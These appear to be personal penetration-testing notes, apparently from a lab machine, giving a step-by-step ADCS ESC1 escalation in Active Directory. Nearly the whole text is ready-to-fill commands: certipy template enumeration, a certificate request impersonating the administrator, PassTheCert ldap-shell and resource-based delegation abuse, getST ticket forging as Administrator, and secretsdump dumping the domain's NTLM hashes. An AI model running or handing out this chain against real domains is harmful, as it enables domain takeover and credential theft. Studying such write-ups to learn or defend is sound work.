ESC1 is the first domain escalation path via ADCS abuse
- allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users
[https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1)
  
first, run certipy
```JavaScript
certipy-ad find -u <user> -p <pass> -dc-ip <IP>
```
![[../../assets/ESC1/image 412.png|image 412.png]]
the contents of the file shows a bunch of information
- Important flags to look out for
    
    - Template name
    
    - Certificate Authority
    
    - Domain name
    
    - DNS
    
    - Enrollment Rights
        
        - if the user you have access to is not part of these groups, you may have to make a new user if possible
            
            - can be done if the user is in the “Remote Management Users” Group
            
        
    
    [[Remote Management Users]]
    
  
Once a user with the correct permissions has been created or found, request a certificate from the domain
![[../../assets/ESC1/image 1 307.png|image 1 307.png]]
- certipy-ad req -username <user> -password <pass> -ca <Certificate-Authority> -dc-ip <IP> -template <template> -upn administrator@<DOMAIN> -dns <DOMAIN>
    
    - may not need to do debug for it to work
    
    - in this instance, ‘hacker_pc$’ was a user created since i had Remote Management Users privs
    
- the information needed, such as CS, template, etc, can be found in the certipy output above
- once this request has been made, try the following command
![[../../assets/ESC1/image 2 258.png|image 2 258.png]]
- certipy auth -pfx <pfx file created> -dc-ip <IP>
    
    - may need to try multiple options given from output
    
if the above doesn’t work, refer to the 2 paths shown below
- path 2 is the intended way to exploit ESC1
  
PATH 1: LDAP SHELL
if the above command doesn’t give a hash, you will need to create a new certificate and key to give to the domain
![[../../assets/ESC1/image 3 220.png|image 3 220.png]]
- making certificate
    
    - certipy-ad cert -pfx administrator_<domain>.pfx -nokey -out user.cert
    
- making key
    
    - certipy-ad cert -pfx administrator_<domain>.pfx -nocert -out user.key
    
  
next, download PassTheCert and pass the newly made certificate and key
https://github.com/AlmondOffSec/PassTheCert
![[../../assets/ESC1/image 4 191.png|image 4 191.png]]
- python PassTheCert/Python/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain <domain> -dc-ip <IP>
    
    - ldap-shell is one of the options that can be used
    
![[../../assets/ESC1/image 5 177.png|image 5 177.png]]
![[/image 18 31.png|image 18 31.png]]
- using the help command in the ldap shell shows us that we can add a user to group
    
    - add_user_to_group <user>
    
- logging back into the machine and executing “net user <user>” should now show administrator
  
PATH 2: TGT
if the above command doesn’t give a hash, you will need to create a new certificate and key to give to the domain
  
The intended way to exploit ESC1 is through the “write_rbcd” action shown below
![[/image 3 220.png|image 3 220.png]]
- making certificate
    
    - certipy-ad cert -pfx administrator_<domain>.pfx -nokey -out user.cert
    
- making key
    
    - certipy-ad cert -pfx administrator_<domain>.pfx -nocert -out user.key
    
  
next, download PassTheCert and pass the newly made certificate and key
https://github.com/AlmondOffSec/PassTheCert
![[../../assets/ESC1/image 6 151.png|image 6 151.png]]
- python PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to ‘AUTHORITY$’ -delegate-from <new computer created> -crt administrator.crt -key administrator.key -domain <domain> -dc-ip <IP>
![[../../assets/ESC1/image 7 140.png|image 7 140.png]]
- make sure your clock is in sync with domain
- sudo ntpdate <IP>
    
    - IP in this case is the machine we’re attacking
    
  
Now get a silver ticket
![[../../assets/ESC1/image 8 119.png|image 8 119.png]]
- [getST.py](http://getST.py) -spn ‘cifs/<DNS name>’ -impersonate Administrator ‘<DOMAIN>/<user>:<pass>
    
    - user and pass in this case is the newly created account made earlier
    
    - DNS name was found earlier from certipy
    
  
Now dump the hashes
![[../../assets/ESC1/image 9 109.png|image 9 109.png]]
- KRB5CCNAME**=**Administrator.ccache secretsdump.py -k -no-pass <DOMAIN>/administrator@<DNS name> -just-dc-ntlm
    
    - DNS name was found earlier from certipy
    
ez dub